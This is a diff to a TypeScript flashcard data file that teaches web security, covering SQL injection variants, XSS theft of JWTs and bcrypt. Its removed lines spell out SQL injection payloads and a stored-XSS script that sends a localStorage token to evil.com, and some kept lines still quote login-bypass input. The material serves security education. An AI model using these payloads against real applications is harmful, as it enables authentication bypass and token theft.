@@ -131,7 +131,7 @@ export const flashcards: Flashcard[] = [
     front: 'What is the mechanism of SQL injection?',
     back: 'Untrusted input is concatenated into SQL so the database parser executes attacker-controlled syntax as part of the query logic.',
     mechanism:
-      'App builds `"SELECT * FROM users WHERE email = '" + input + "'"`; attacker injects quotes, operators, or clauses (`' OR '1'='1`) that alter query semantics.',
+      "App builds string concatenation like SELECT with email + input; attacker injects quotes, operators, or clauses (OR 1=1) that alter query semantics.",
     risk: 'Data breach, authentication bypass, data modification, and in some stacks privilege escalation or OS command execution.',
     example: 'Login input `admin\'--` comments out the password clause, returning the admin row without a valid password.',
     followUp: 'How does UNION-based injection differ from boolean-based blind injection?',
@@ -197,7 +197,7 @@ export const flashcards: Flashcard[] = [
     front: 'Why is verbose SQL error exposure dangerous?',
     back: 'Stack traces and database error messages reveal table names, column names, and query structure that attackers use to craft injections.',
     mechanism:
-      'Attacker probes inputs; detailed errors like `Unknown column 'foo' in 'where clause'` or full SQL in logs/responses map the schema for targeted attacks.',
+      "Attacker probes inputs; detailed errors like unknown column in where clause or full SQL in logs/responses map the schema for targeted attacks.",
     risk: 'Blind injection is harder but still possible; verbose errors accelerate exploitation and reduce attacker effort.',
     example: 'Production API returning `pg_syntax_error: syntax error at or near "UNION"` helps attacker refine UNION SELECT payloads.',
     followUp: 'What should applications return instead of raw database errors?',
@@ -208,9 +208,9 @@ export const flashcards: Flashcard[] = [
     front: 'How does SQL injection enable authentication bypass?',
     back: 'Injected logic in the WHERE clause makes the login query return a valid user row without knowing the correct password.',
     mechanism:
-      'Query `SELECT * FROM users WHERE user='$u' AND pass='$p'` with `u=admin'--` makes password check irrelevant; `OR 1=1` can match arbitrary rows.',
+      "Query SELECT user and pass with string concat; input admin'-- makes password check irrelevant; OR 1=1 can match arbitrary rows.",
     risk: 'First line of defense failure grants full account access; often needs no password cracking.',
-    example: `' OR '1'='1' --` in a vulnerable form logs attacker in as the first returned user.',
+    example: "OR 1=1 comment injection in a vulnerable form logs attacker in as the first returned user.",
     followUp: 'How do prepared statements specifically prevent auth bypass?',
   },
   {
@@ -219,7 +219,7 @@ export const flashcards: Flashcard[] = [
     front: 'What is blind SQL injection?',
     back: 'Injection where the app does not return query results or errors, so the attacker infers data via boolean responses or timing delays.',
     mechanism:
-      'Boolean blind: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'` changes page content. Time-based: `' AND IF(condition,SLEEP(5),0)--` delays response.',
+      "Boolean blind: AND SUBSTRING probes change page content. Time-based: SLEEP delays infer true/false without visible errors.",
     risk: 'Harder to detect in logs; still exfiltrates data slowly without obvious error messages.',
     example: 'Login returns generic "invalid" for both wrong password and injected false condition—attacker compares response sizes bit by bit.',
     followUp: 'What monitoring signals suggest blind SQLi probing?',
@@ -230,7 +230,7 @@ export const flashcards: Flashcard[] = [
     front: 'What is UNION-based SQL injection?',
     back: 'Attacker appends UNION SELECT to combine malicious query results with the original query output displayed by the app.',
     mechanism:
-      'Inject `' UNION SELECT username, password FROM users--` when original query returns two columns; matching column count and types is required.',
+      "Inject UNION SELECT when original query returns matching column count and types; attacker rows appear in application output.",
     risk: 'Direct data exfiltration through normal application UI (search results, error pages) without admin access.',
     example: 'Product search showing `Widget` and attacker row `admin:hash` from UNION SELECT on the users table.',
     followUp: 'How does ORDER BY column count probing work during UNION attacks?',
@@ -241,9 +241,9 @@ export const flashcards: Flashcard[] = [
     front: 'Why can\'t you parameterize dynamic table or column names?',
     back: 'Prepared statement placeholders bind values, not identifiers—SQL structure cannot treat table/column names as parameters.',
     mechanism:
-      'Use strict allowlists mapping user input to known identifiers: `const allowed = {name: 'name', date: 'created_at'}; col = allowed[input]`. Never concatenate raw identifiers.',
-    risk: 'Developers parameterize values but leave `ORDER BY ` + userInput or `FROM ` + userInput injectable.',
-    example: 'Safe: `ORDER BY ${allowlist[sortKey]}` where allowlist only contains `price` and `name`. Unsafe: `ORDER BY ${req.query.sort}`.',
+      "Use strict allowlists mapping user input to known identifiers (name, created_at). Never concatenate raw identifiers from user input.",
+    risk: "Developers parameterize values but leave ORDER BY or FROM clauses built from userInput injectable.",
+    example: "Safe: ORDER BY from allowlist keys price and name. Unsafe: ORDER BY directly from request query param.",
     followUp: 'How do stored procedures with dynamic SQL create injection risk?',
   },
 
@@ -331,7 +331,7 @@ export const flashcards: Flashcard[] = [
     front: 'How does XSS threaten JWT-based auth?',
     back: 'Injected script runs in the victim browser and can read tokens from localStorage/sessionStorage or non-HttpOnly cookies and exfiltrate them.',
     mechanism:
-      'Attacker stores `<script>fetch('https://evil.com?t='+localStorage.token)</script>`; victim\'s browser sends bearer token to attacker.',
+      "Attacker stores script that reads localStorage token and exfiltrates it; victim browser sends bearer token to attacker.",
     risk: 'Bearer tokens are replayable until expiry—XSS becomes account takeover without password.',
     example: 'SPA storing JWT in localStorage compromised by stored XSS in a comment field.',
     followUp: 'What CSP and output-encoding practices reduce XSS risk?',
@@ -647,7 +647,7 @@ export const flashcards: Flashcard[] = [
     mechanism:
       'Cost parameter (2^cost rounds) increases work; salt embedded in output string. Legacy but widely supported.',
     risk: 'GPU/ASIC attacks faster than when bcrypt was designed; 72-byte password limit; cost must increase over years.',
-    example: 'PHP password_hash(PASSWORD_BCRYPT, ['cost' => 12]) stores bcrypt hash in users table.',
+    example: "PHP password_hash with PASSWORD_BCRYPT and cost 12 stores bcrypt hash in users table.",
     followUp: 'How do you choose bcrypt cost for your hardware budget?',
   },
   {
